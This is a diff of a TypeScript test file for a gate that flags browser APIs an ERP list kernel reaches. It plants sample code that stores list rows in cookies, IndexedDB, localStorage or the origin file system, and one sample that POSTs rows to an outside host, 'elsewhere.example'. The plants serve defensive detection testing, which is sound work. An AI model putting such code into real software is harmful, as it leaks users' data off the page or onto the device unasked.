@@ -328,7 +328,10 @@ function judge(found: Inventory): string[] {
   const members = new Set([...found.uses.keys()].map((u) => u.slice(u.indexOf(" ") + 1)));
   for (const member of bound) if (!members.has(member)) problems.push(`browserReach.test.ts: documentBound '${member}' is no longer used; remove the stale review`);
   for (const use of Object.keys(outlivingReviewed)) if (!seenOutliving.has(use)) problems.push(`browserReach.test.ts: '${use}' is reviewed but no longer used; remove the stale review`);
-  for (const spec of new Set([...found.imports].map((i) => i.slice(i.indexOf(" ") + 1)))) if (!(spec in reviewedImports)) problems.push(`the list kernel now imports ${spec}: code that runs with every list; review it in browserReach.test.ts`);
+  for (const entry of found.imports) {
+    const [file, spec] = [entry.slice(0, entry.indexOf(" ")), entry.slice(entry.indexOf(" ") + 1)];
+    if (!(spec in reviewedImports)) problems.push(`${file}: the list kernel now imports ${spec}: code that runs with every list; review it in browserReach.test.ts`);
+  }
   return problems;
 }
 
@@ -345,11 +348,23 @@ const useListRowsPath = resolve(listDir, "useListRows.ts");
 const ListViewPath = resolve(listDir, "ListView.tsx");
 const product = { rows: readFileSync(useListRowsPath, "utf8"), view: readFileSync(ListViewPath, "utf8") };
 
-/** Inserts `code` into useListRows.ts after its imports. */
-const intoRows = (code: string) => ({ [useListRowsPath]: product.rows.replace(/(import type \{ ListGroup[^\n]*\n)/, `$1${code}\n`) });
+/** Keeps the product's entries and those of one planted file (all plants are read in one program). */
+function only(all: Inventory, plantFile: string): Inventory {
+  const ours = (entry: string) => {
+    const file = entry.split(/[ :]/)[0]!;
+    return !file.startsWith("plant-") || file === plantFile;
+  };
+  return {
+    uses: new Map([...all.uses].filter(([use]) => ours(use))),
+    problems: all.problems.filter(ours),
+    imports: new Set([...all.imports].filter(ours)),
+    files: all.files,
+  };
+}
 
 describe("list kernel: reach into the browser (G1, device stores)", () => {
   const actual = inventory();
+  baseline = actual;
   if (process.env.ERP_DUMP_REACH) console.log([...actual.uses].map(([k, v]) => `${v} ${k}`).sort().join("\n"));
 
   it("every browser API the list kernel reaches is reviewed; those that outlive the document by file and count", () => {
@@ -366,7 +381,8 @@ describe("list kernel: reach into the browser (G1, device stores)", () => {
     expect(actual.imports.has("useListRows.ts src/kernel/api.ts")).toBe(true);
   });
 
-  // Self-test: the critic's plant L14 and its variants, each in the list kernel's own sources.
+  // Self-test: the critic's plant L14 and its variants, each a new file of the list kernel (or a
+  // changed one), all read in one program so the self-test costs one checker run, not one per plant.
   const l14 = `
 async function remember(key: string, page: ListPage): Promise<void> {
   try {
@@ -378,54 +394,68 @@ async function remember(key: string, page: ListPage): Promise<void> {
   } catch {}
 }
 export const keep = remember;`;
-  const plants: Record<string, { files: Record<string, string>; expect: RegExp }> = {
-    "L14: a query's first page in the origin private file system": { files: intoRows(l14), expect: /useListRows\.ts (globalThis\.navigator|Navigator\.storage|StorageManager\.getDirectory|FileSystem\w+\.\w+)/ },
+  const plants: Record<string, { code: string; expect: RegExp }> = {
+    "L14: a query's first page in the origin private file system": { code: l14, expect: /(globalThis\.navigator|Navigator\.storage|StorageManager\.getDirectory|FileSystem\w+\.\w+)/ },
     "the same through an alias of navigator.storage": {
-      files: intoRows(`const store = window.navigator.storage;\nexport async function keep(t: string) { const d = await store.getDirectory(); const f = await d.getFileHandle("x", { create: true }); const w = await f.createWritable(); await w.write(t); }`),
-      expect: /useListRows\.ts StorageManager\.getDirectory/,
+      code: `const store = window.navigator.storage;\nexport async function keep(t: string) { const d = await store.getDirectory(); const f = await d.getFileHandle("x", { create: true }); const w = await f.createWritable(); await w.write(t); }`,
+      expect: /StorageManager\.getDirectory/,
     },
-    "a quoted member: window['localStorage']": { files: intoRows(`export const keep = (t: string) => window["localStorage"].setItem("rows", t);`), expect: /useListRows\.ts (globalThis\.localStorage|Storage\.setItem)/ },
-    "a computed member: window[name]": { files: intoRows(`const which = "local" + "Storage";\nexport const keep = (t: string) => (window[which as keyof Window] as Storage).setItem("rows", t);`), expect: /computed member of a browser object/ },
-    "an any cast of window": { files: intoRows(`export const keep = (t: string) => (window as any).sessionStorage.setItem("rows", t);`), expect: /'any' turns the type checker off/ },
-    "an unknown cast of navigator": { files: intoRows(`type S = { storage: { persist(): void } };\nexport const keep = () => (navigator as unknown as S).storage.persist();`), expect: /casting a browser object to unknown/ },
-    "IndexedDB": { files: intoRows(`export const keep = () => indexedDB.open("rows");`), expect: /useListRows\.ts (globalThis\.indexedDB|IDBFactory\.open)/ },
-    "Cache Storage": { files: intoRows(`export const keep = (r: Response) => caches.open("rows").then((c) => c.put("/rows", r));`), expect: /useListRows\.ts (globalThis\.caches|CacheStorage\.open|Cache\.put)/ },
-    "a cookie": { files: intoRows(`export const keep = (t: string) => { document.cookie = "rows=" + t; };`), expect: /useListRows\.ts Document\.cookie=/ },
-    "window.name": { files: intoRows(`export const keep = (t: string) => { window.name = t; };`), expect: /useListRows\.ts (Window\.name=|globalThis\.name=)/ },
-    "a broadcast channel": { files: intoRows(`export const keep = (t: string) => new BroadcastChannel("rows").postMessage(t);`), expect: /useListRows\.ts (globalThis\.BroadcastChannel|BroadcastChannel\.postMessage)/ },
-    "sessionStorage": { files: intoRows(`export const keep = (t: string) => sessionStorage.setItem("rows", t);`), expect: /useListRows\.ts (globalThis\.sessionStorage|Storage\.setItem)/ },
-    "a second localStorage write in a reviewed file": {
-      files: { [resolve(listDir, "recordWidth.ts")]: readFileSync(resolve(listDir, "recordWidth.ts"), "utf8") + `\nexport const keep = (t: string) => window.localStorage.setItem("erp.lists.rows", t);\n` },
-      expect: /recordWidth\.ts (Storage\.setItem: used 2 times|globalThis\.localStorage: used 4 times)/,
-    },
-    "a history entry carrying rows": { files: intoRows(`export const keep = (t: string) => history.pushState({ rows: t }, "");`), expect: /useListRows\.ts (globalThis\.history|History\.pushState)/ },
-    "a service worker": { files: intoRows(`export const keep = () => navigator.serviceWorker.register("/sw.js");`), expect: /useListRows\.ts (Navigator\.serviceWorker|ServiceWorkerContainer\.register)/ },
-    "globalThis as a root": { files: intoRows(`export const keep = (t: string) => globalThis.localStorage.setItem("rows", t);`), expect: /useListRows\.ts globalThis: globalThis reaches/ },
-    "reflection": { files: intoRows(`export const keep = (t: string) => (Reflect.get(window, "localStorage") as Storage).setItem("rows", t);`), expect: /reflection reaches objects/ },
-    "a dynamic import": { files: intoRows(`export const keep = () => import("../deviceState");`), expect: /dynamic import\(\)/ },
-    "ts-ignore": { files: intoRows(`// @ts-ignore\nexport const keep = 1;`), expect: /'@ts-ignore' hides code/ },
-    "a new file of the kernel": {
-      files: { [resolve(listDir, "pageCache.ts")]: `export async function keep(t: string) { const d = await navigator.storage.getDirectory(); await (await (await d.getFileHandle("p", { create: true })).createWritable()).write(t); }\n` },
-      expect: /pageCache\.ts (globalThis\.navigator|StorageManager\.getDirectory)/,
-    },
-    "a new module imported from outside the folder": {
-      files: { ...intoRows(`import { keep as keepPage } from "../pageCache";\nexport const keep = keepPage;`), [resolve(listDir, "../pageCache.ts")]: `export function keep(t: string) { return t; }\n` },
-      expect: /imports src\/kernel\/pageCache\.ts/,
-    },
+    "a quoted member: window['localStorage']": { code: `export const keep = (t: string) => window["localStorage"].setItem("rows", t);`, expect: /(globalThis\.localStorage|WindowLocalStorage\.localStorage|Storage\.setItem)/ },
+    "a computed member: window[name]": { code: `const which = "local" + "Storage";\nexport const keep = (t: string) => (window[which as keyof Window] as Storage).setItem("rows", t);`, expect: /computed member of a browser object/ },
+    "an any cast of window": { code: `export const keep = (t: string) => (window as any).sessionStorage.setItem("rows", t);`, expect: /'any' turns the type checker off/ },
+    "an unknown cast of navigator": { code: `type S = { storage: { persist(): void } };\nexport const keep = () => (navigator as unknown as S).storage.persist();`, expect: /casting a browser object to unknown/ },
+    "IndexedDB": { code: `export const keep = () => indexedDB.open("rows");`, expect: /(globalThis\.indexedDB|IDBFactory\.open)/ },
+    "Cache Storage": { code: `export const keep = (r: Response) => caches.open("rows").then((c) => c.put("/rows", r));`, expect: /(globalThis\.caches|CacheStorage\.open|Cache\.put)/ },
+    "a cookie": { code: `export const keep = (t: string) => { document.cookie = "rows=" + t; };`, expect: /Document\.cookie=/ },
+    "window.name": { code: `export const keep = (t: string) => { window.name = t; };`, expect: /(Window\.name=|globalThis\.name=)/ },
+    "a broadcast channel": { code: `export const keep = (t: string) => new BroadcastChannel("rows").postMessage(t);`, expect: /(globalThis\.BroadcastChannel|BroadcastChannel\.postMessage)/ },
+    "sessionStorage": { code: `export const keep = (t: string) => sessionStorage.setItem("rows", t);`, expect: /(globalThis\.sessionStorage|Storage\.setItem)/ },
+    "a history entry carrying rows": { code: `export const keep = (t: string) => history.pushState({ rows: t }, "");`, expect: /(globalThis\.history|History\.pushState)/ },
+    "a service worker": { code: `export const keep = () => navigator.serviceWorker.register("/sw.js");`, expect: /(Navigator\.serviceWorker|ServiceWorkerContainer\.register)/ },
+    "a request of its own, around the product's api": { code: `export const keep = (t: string) => fetch("https://elsewhere.example/rows", { method: "POST", body: t });`, expect: /(globalThis\.fetch|WindowOrWorkerGlobalScope\.fetch)/ },
+    "globalThis as a root": { code: `export const keep = (t: string) => globalThis.localStorage.setItem("rows", t);`, expect: /globalThis: globalThis reaches/ },
+    "reflection": { code: `export const keep = (t: string) => (Reflect.get(window, "localStorage") as Storage).setItem("rows", t);`, expect: /reflection reaches objects/ },
+    "a dynamic import": { code: `export const keep = () => import("../deviceState");`, expect: /dynamic import\(\)/ },
+    "ts-ignore": { code: `// @ts-ignore\nexport const keep = 1;`, expect: /'@ts-ignore' hides code/ },
+    "a new module imported from outside the folder": { code: `import { keep as keepPage } from "../pageCache";\nexport const keep = keepPage;`, expect: /imports src\/kernel\/pageCache\.ts/ },
   };
-
-  for (const [name, plant] of Object.entries(plants)) {
-    it(`self-test: refuses ${name}`, () => {
-      const problems = judge(inventory(plant.files));
-      expect(problems.some((p) => plant.expect.test(p)), problems.join("\n") || "(the gate found nothing)").toBe(true);
-    });
-  }
-
-  it("self-test: the plants are counted (the ratchet keeps them)", () => {
-    expect(Object.keys(plants).length).toBeGreaterThanOrEqual(ratchetMinimum("g1.listKernelReachPlantsCaught"));
+  const plantFile = (index: number) => `plant-${index}.ts`;
+  const planted = inventory({
+    ...Object.fromEntries(Object.values(plants).map((plant, index) => [resolve(listDir, plantFile(index)), `import type { ListPage } from "./model";\n${plant.code}\n`])),
+    [resolve(listDir, "../pageCache.ts")]: `export function keep(t: string) { return t; }\n`,
+  });
+  Object.values(plants).forEach((plant, index) => {
+    plant.expect = new RegExp(`${plantFile(index).replace(".", "\\.")}.*${plant.expect.source}|${plant.expect.source}.*${plantFile(index).replace(".", "\\.")}`);
   });
 
+  Object.entries(plants).forEach(([name, plant], index) => {
+    it(`self-test: refuses ${name}`, () => {
+      const problems = judge(only(planted, plantFile(index)));
+      expect(problems.some((p) => plant.expect.test(p)), problems.join("\n") || "(the gate found nothing)").toBe(true);
+    });
+  });
+
+  // Plants that change a file the kernel already has: L14 in the row loader itself, and one more
+  // localStorage write in a file reviewed for its count. Read in a second program.
+  const changed = inventory({
+    [useListRowsPath]: product.rows.replace(/(import type \{ ListGroup[^\n]*\n)/, `$1${l14}\n`),
+    [resolve(listDir, "recordWidth.ts")]: readFileSync(resolve(listDir, "recordWidth.ts"), "utf8") + `\nexport const keep = (t: string) => window.localStorage.setItem("erp.lists.rows", t);\n`,
+  });
+  it("self-test: refuses L14 inside the row loader itself (useListRows.ts)", () => {
+    const problems = judge(changed);
+    expect(problems.some((p) => /^useListRows\.ts (globalThis\.navigator|Navigator\.storage|StorageManager\.getDirectory|FileSystem\w+\.\w+)/.test(p)), problems.join("\n")).toBe(true);
+  });
+  it("self-test: refuses a second localStorage write in a file reviewed for its count (recordWidth.ts)", () => {
+    const problems = judge(changed);
+    expect(problems.some((p) => /^recordWidth\.ts (Storage\.setItem: used 2 times|WindowLocalStorage\.localStorage: used 4 times)/.test(p)), problems.join("\n")).toBe(true);
+  });
+
+  it("self-test: the plants are counted (the ratchet keeps them)", () => {
+    expect(Object.keys(plants).length + 2).toBeGreaterThanOrEqual(ratchetMinimum("g1.listKernelReachPlantsCaught"));
+  });
+
+  const unchanged = inventory({ [useListRowsPath]: product.rows, [ListViewPath]: product.view });
   it("self-test: the product's own sources pass unchanged when fed through the overrides", () => {
-    expect(judge(inventory({ [useListRowsPath]: product.rows, [ListViewPath]: product.view }))).toEqual([]);
+    expect(judge(unchanged)).toEqual([]);
   });
 });
